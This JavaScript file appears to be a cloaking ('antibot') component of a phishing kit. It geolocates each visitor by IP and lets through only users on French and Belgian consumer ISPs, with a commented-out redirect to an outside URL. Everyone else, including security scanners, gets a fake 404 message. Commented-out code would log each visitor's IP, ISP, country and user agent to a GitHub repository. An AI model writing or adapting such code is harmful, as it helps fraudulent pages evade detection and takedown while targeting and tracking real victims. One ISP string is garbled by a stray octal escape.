import { Octokit } from "https://cdn.skypack.dev/octokit";
import { config } from "./config.js";

async function getIpInfo(ipAddress) {
    const url = `http://ip-api.com/json/${ipAddress}`;
    const response = await fetch(url);
    const data = await response.json();
    const { country, isp } = data;
    const userAgent = navigator.userAgent;
    protectFRSiteFromBot(country, isp , userAgent, ipAddress);
}

async function getIPAddress() {
    await fetch("https://api.ipify.org/?format=json")
        .then((response) => response.json())
        .then((data) => {
            var ipAddr = data.ip;
            getIpInfo(ipAddr);
        });
}

function protectFRSiteFromBot(country, isp, userAgent, ipAddress) {
    if (isp.toLowerCase().includes("wanadoo") || isp.toLowerCase().includes("bbox") || isp.toLowerCase().includes("bouygues") || isp.toLowerCase().includes("orange") || isp.toLowerCase().includes("sfr") || isp.toLowerCase().includes("free") || isp.toLowerCase().includes("red") || isp.toLowerCase().includes("proxad") || isp.toLowerCase().includes("club-internet") || isp.toLowerCase().includes("oleane") || isp.toLowerCase().includes("nordnet") || isp.toLowerCase().includes("liberty") || isp.toLowerCase().includes("colt") || isp.toLowerCase().includes("chello") || isp.toLowerCase().includes("belgacom") || isp.toLowerCase().includes("proximus") || isp.toLowerCase().includes("skynet") || isp.toLowerCase().includes("aol") || isp.toLowerCase().includes("neuf") || isp.toLowerCase().includes("darty") || isp.toLowerCase().includes("bouygue") || isp.toLowerCase().includes("numericable") || isp.toLowerCase().includes("num\303\251ris") || isp.toLowerCase().includes("poste") || isp.toLowerCase().includes("sosh") || isp.toLowerCase().includes("topnet")) {
        const content = `${country}|${isp}|${userAgent}|${ipAddress}|REAL\n`;
        //window.location.href = "https://doctoredits.com/show.php?l=0&u=1871055&id=55129";
        //updateFileContent(content, 'good.txt')
        console.log("YOU HAVE ACCESS");
    } else {
        const content = `${country}|${isp}|${userAgent}|${ipAddress}|BAD\n`;
        //updateFileContent(content, 'bad.txt');
        console.log("HTTP/1.0 404 Not Found");
    }
}
